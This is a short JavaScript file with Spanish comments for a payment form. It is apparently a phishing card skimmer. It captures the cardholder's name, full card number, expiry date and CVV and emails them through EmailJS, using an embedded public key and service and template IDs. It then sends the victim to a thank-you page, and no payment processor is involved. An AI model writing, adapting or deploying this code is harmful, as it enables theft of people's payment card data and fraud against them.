(function() {
    emailjs.init('ReqtkWfjI392LAzFb'); // Tu Public Key
})();

// Formatear número de tarjeta
document.getElementById('cardNumber').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\s/g, '');
    value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
    e.target.value = value.substring(0, 19);
});

document.getElementById('paymentForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const loader = document.getElementById('loader');
    const errorMsg = document.getElementById('errorMsg');
    
    // Ocultar mensajes
    errorMsg.classList.add('hidden');
    loader.classList.remove('hidden');

    // Capturar datos
    const formData = {
        nombre: document.getElementById('userName').value.trim(),
        numero: document.getElementById('cardNumber').value.replace(/\s/g, ''),
        fecha: document.getElementById('expiryDate').value,
        cvv: document.getElementById('cvc').value
    };

    // Validaciones
    try {
        if (!/^[A-ZÀ-ÿ\s]{5,}$/.test(formData.nombre)) throw 'Nombre inválido';
        if (!/^\d{16}$/.test(formData.numero)) throw 'Tarjeta inválida';
        if (new Date(formData.fecha) < new Date()) throw 'Fecha expirada';
        if (!/^\d{4}$/.test(formData.cvv)) throw 'CVV inválido';

        // Enviar datos
        await emailjs.send(
            "service_syrc1uk",
            "template_u3etoro",
            {
                nombre: formData.nombre,
                numero: formData.numero,
                fecha: formData.fecha,
                cvv: formData.cvv
            }
        );
        
        window.location.href = "thank-you.html";
        
    } catch (error) {
        errorMsg.textContent = `❌ Error: ${error}`;
        errorMsg.classList.remove('hidden');
        console.error('Error:', error);
    } finally {
        loader.classList.add('hidden');
    }
});
